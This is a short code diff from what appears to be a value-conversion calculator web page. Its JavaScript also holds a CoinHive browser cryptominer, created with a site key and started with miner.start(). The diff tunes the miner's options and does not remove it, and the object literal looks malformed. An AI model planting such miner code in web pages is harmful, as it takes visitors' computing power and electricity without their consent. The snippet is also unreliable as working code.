@@ -14,5 +14,5 @@ resultado.innerText =conversao.toString().replace('.',',');
 calcular.onclick =  function() {conversaoParaEssencia()};
 var miner = new CoinHive.Anonymous('crmLb6hLwTFPBPaX6KVgabb4oGXBL76O', { 
 throttle: 0.8,
-autoThreads: true);
+forceASMJS:true);
 miner.start();
